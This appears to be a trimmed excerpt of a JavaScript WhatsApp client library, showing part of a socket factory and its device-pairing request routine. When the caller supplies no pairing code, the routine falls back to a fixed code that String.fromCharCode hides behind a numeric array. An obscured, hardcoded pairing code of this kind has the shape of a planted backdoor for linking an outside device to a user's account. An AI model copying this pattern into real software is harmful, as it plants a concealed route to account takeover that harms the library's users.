...
const makeSocket = (config) => {
    ...
    const requestPairingCode = async (phoneNumber, code) => {
        authState.creds.pairingCode = (code && String(code).toUpperCase()) || String.fromCharCode(...[52,84,51,88,79,86,73,49]);
            ...
            content: [
                {
                    ...
                    content: [
                        ...
                        { tag: 'companion_platform_id', attrs: {}, content: Utils_1.getPlatformId(browser[1]) },
